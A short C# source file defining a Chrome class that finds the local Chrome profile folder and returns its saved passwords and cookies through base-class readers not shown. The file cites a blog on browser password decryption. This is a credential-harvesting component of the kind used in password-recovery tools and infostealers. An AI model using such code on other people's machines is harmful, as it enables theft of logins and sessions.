using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace dao
{
    /// <summary>
    /// http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
    /// </summary>
    class Chrome : BaseChrome, IReader
    {
        public string BrowserName { get { return "Chrome"; } }

        public IEnumerable<PassModel> Passwords()
        {
            String LOCAL_PATH = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            return base.Reads(Path.Combine(LOCAL_PATH, @"Google\Chrome\User Data"));
        }

        public IEnumerable<Cookie> Cookies(string host = null)
        {
            String LOCAL_PATH = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            return base.ReadsCookie(Path.Combine(LOCAL_PATH, @"Google\Chrome\User Data"), host);
        }
    }



}
